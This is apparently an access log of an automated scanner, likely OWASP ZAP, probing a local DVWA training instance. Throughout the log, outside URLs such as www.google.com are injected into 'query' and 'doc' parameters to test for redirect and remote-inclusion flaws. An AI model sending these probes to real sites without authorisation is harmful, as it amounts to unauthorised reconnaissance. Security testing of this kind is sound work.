172.17.0.1 - - [12/Feb/2019:08:55:14 +0000] "GET /dvwa/images/logo.png?query=www.google.com%3A80%2F HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:14 +0000] "GET /dvwa/images/RandomStorm.png?query=www.google.com%2F HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:14 +0000] "GET /dvwa/images/logo.png?query=www.google.com HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:14 +0000] "GET /dvwa/images/RandomStorm.png?query=www.google.com%3A80%2F HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:14 +0000] "GET /dvwa/images/logo.png?query=www.google.com%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:14 +0000] "GET /dvwa/images/RandomStorm.png?query=www.google.com HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:14 +0000] "GET /dvwa/images/logo.png?query=www.google.com%3A80%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:14 +0000] "GET /dvwa/images/RandomStorm.png?query=www.google.com%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:14 +0000] "GET /dvwa/images/RandomStorm.png?query=www.google.com%3A80%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:14 +0000] "GET /dvwa/js HTTP/1.1" 301 526 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:14 +0000] "GET /dvwa/images/spanner.png?query=http%3A%2F%2Fwww.google.com%2F HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:14 +0000] "GET /dvwa/images/spanner.png?query=http%3A%2F%2Fwww.google.com%3A80%2F HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:14 +0000] "GET /dvwa/images/spanner.png?query=http%3A%2F%2Fwww.google.com HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:14 +0000] "GET /dvwa/images/spanner.png?query=http%3A%2F%2Fwww.google.com%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:14 +0000] "GET /dvwa/images/spanner.png?query=http%3A%2F%2Fwww.google.com%3A80%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:14 +0000] "GET /dvwa/images/spanner.png?query=www.google.com%2F HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:14 +0000] "GET /dvwa/images/spanner.png?query=www.google.com%3A80%2F HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:14 +0000] "GET /dvwa/js?query=http%3A%2F%2Fwww.google.com%2F HTTP/1.1" 301 600 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:14 +0000] "GET /dvwa/images/spanner.png?query=www.google.com HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:14 +0000] "GET /dvwa/js/?query=http%3A%2F%2Fwww.google.com%2F HTTP/1.1" 200 1347 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:14 +0000] "GET /dvwa/images/spanner.png?query=www.google.com%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:14 +0000] "GET /dvwa/js?query=http%3A%2F%2Fwww.google.com%3A80%2F HTTP/1.1" 301 610 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:14 +0000] "GET /dvwa/js/?query=http%3A%2F%2Fwww.google.com%3A80%2F HTTP/1.1" 200 1347 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:14 +0000] "GET /dvwa/images/spanner.png?query=www.google.com%3A80%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:14 +0000] "GET /dvwa/js?query=http%3A%2F%2Fwww.google.com HTTP/1.1" 301 594 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:14 +0000] "GET /dvwa/js/?query=http%3A%2F%2Fwww.google.com HTTP/1.1" 200 1347 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:14 +0000] "GET /dvwa/js?query=http%3A%2F%2Fwww.google.com%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 301 652 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:14 +0000] "GET /dvwa/js/?query=http%3A%2F%2Fwww.google.com%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 200 1347 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:14 +0000] "GET /dvwa/js?query=http%3A%2F%2Fwww.google.com%3A80%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 301 662 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:14 +0000] "GET /dvwa/js/?query=http%3A%2F%2Fwww.google.com%3A80%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 200 1347 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "GET /dvwa/js?query=www.google.com%2F HTTP/1.1" 301 574 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "GET /dvwa/js/?query=www.google.com%2F HTTP/1.1" 200 1347 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "GET /dvwa/js?query=www.google.com%3A80%2F HTTP/1.1" 301 584 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "GET /dvwa/js/?query=www.google.com%3A80%2F HTTP/1.1" 200 1347 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "GET /dvwa/js?query=www.google.com HTTP/1.1" 301 568 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "GET /dvwa/js/?query=www.google.com HTTP/1.1" 200 1347 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "GET /dvwa/js?query=www.google.com%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 301 626 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "GET /dvwa/js/?query=www.google.com%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 200 1347 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "GET /dvwa/js?query=www.google.com%3A80%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 301 636 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "GET /dvwa/js/?query=www.google.com%3A80%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 200 1347 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "GET /dvwa/js/add_event_listeners.js?query=http%3A%2F%2Fwww.google.com%2F HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "GET /dvwa/js/add_event_listeners.js?query=http%3A%2F%2Fwww.google.com%3A80%2F HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "GET /dvwa/js/dvwaPage.js?query=http%3A%2F%2Fwww.google.com%2F HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "GET /dvwa/js/add_event_listeners.js?query=http%3A%2F%2Fwww.google.com HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "GET /dvwa/js/dvwaPage.js?query=http%3A%2F%2Fwww.google.com%3A80%2F HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "GET /dvwa/js/add_event_listeners.js?query=http%3A%2F%2Fwww.google.com%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "GET /dvwa/js/dvwaPage.js?query=http%3A%2F%2Fwww.google.com HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "GET /dvwa/js/add_event_listeners.js?query=http%3A%2F%2Fwww.google.com%3A80%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "GET /dvwa/js/dvwaPage.js?query=http%3A%2F%2Fwww.google.com%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "GET /dvwa/js/add_event_listeners.js?query=www.google.com%2F HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "GET /dvwa/js/dvwaPage.js?query=http%3A%2F%2Fwww.google.com%3A80%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "GET /dvwa/js/add_event_listeners.js?query=www.google.com%3A80%2F HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "GET /dvwa/js/dvwaPage.js?query=www.google.com%2F HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "GET /dvwa/js/add_event_listeners.js?query=www.google.com HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "GET /dvwa/js/dvwaPage.js?query=www.google.com%3A80%2F HTTP/1.1" 200 1315 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "GET /dvwa/js/add_event_listeners.js?query=www.google.com%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "GET /dvwa/js/dvwaPage.js?query=www.google.com HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "GET /dvwa/js/add_event_listeners.js?query=www.google.com%3A80%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "GET /dvwa/js/dvwaPage.js?query=www.google.com%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "GET /dvwa/js/dvwaPage.js?query=www.google.com%3A80%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "GET /instructions.php?query=http%3A%2F%2Fwww.google.com%2F HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "GET /favicon.ico?query=http%3A%2F%2Fwww.google.com%2F HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "GET /instructions.php?query=http%3A%2F%2Fwww.google.com%3A80%2F HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "GET /favicon.ico?query=http%3A%2F%2Fwww.google.com%3A80%2F HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "GET /favicon.ico?query=http%3A%2F%2Fwww.google.com HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "GET /instructions.php?query=http%3A%2F%2Fwww.google.com HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "GET /favicon.ico?query=http%3A%2F%2Fwww.google.com%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "GET /instructions.php?query=http%3A%2F%2Fwww.google.com%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "GET /favicon.ico?query=http%3A%2F%2Fwww.google.com%3A80%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "GET /favicon.ico?query=www.google.com%2F HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "GET /instructions.php?query=http%3A%2F%2Fwww.google.com%3A80%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "GET /favicon.ico?query=www.google.com%3A80%2F HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "GET /instructions.php?query=www.google.com%2F HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "GET /favicon.ico?query=www.google.com HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "GET /instructions.php?query=www.google.com%3A80%2F HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "GET /favicon.ico?query=www.google.com%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "GET /instructions.php?query=www.google.com HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "GET /instructions.php?query=www.google.com%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 200 14324 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "GET /favicon.ico?query=www.google.com%3A80%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "GET /instructions.php?query=www.google.com%3A80%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "GET /instructions.php?doc=http%3A%2F%2Fwww.google.com%2F HTTP/1.1" 200 14305 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "GET /login.php?query=http%3A%2F%2Fwww.google.com%2F HTTP/1.1" 200 1795 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "GET /instructions.php?doc=http%3A%2F%2Fwww.google.com%3A80%2F HTTP/1.1" 200 14305 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "GET /login.php?query=http%3A%2F%2Fwww.google.com%3A80%2F HTTP/1.1" 200 1795 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "GET /login.php?query=http%3A%2F%2Fwww.google.com HTTP/1.1" 200 1795 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "GET /instructions.php?doc=http%3A%2F%2Fwww.google.com HTTP/1.1" 200 14305 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "GET /login.php?query=http%3A%2F%2Fwww.google.com%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 200 1795 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "GET /instructions.php?doc=http%3A%2F%2Fwww.google.com%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 200 14305 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "GET /instructions.php?doc=http%3A%2F%2Fwww.google.com%3A80%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 200 14305 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "GET /login.php?query=http%3A%2F%2Fwww.google.com%3A80%2Fsearch%3Fq%3DOWASP%2520ZAP HTTP/1.1" 200 1795 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "GET /login.php?query=www.google.com%2F HTTP/1.1" 200 1795 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "GET /instructions.php?doc=www.google.com%2F HTTP/1.1" 200 14305 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "GET /login.php?query=www.google.com%3A80%2F HTTP/1.1" 200 1795 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "GET /instructions.php?doc=www.google.com%3A80%2F HTTP/1.1" 200 14305 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "GET /login.php?query=www.google.com HTTP/1.1" 200 1795 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:15 +0000] "GET /instructions.php?doc=www.google.com HTTP/1.1" 200 14305 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
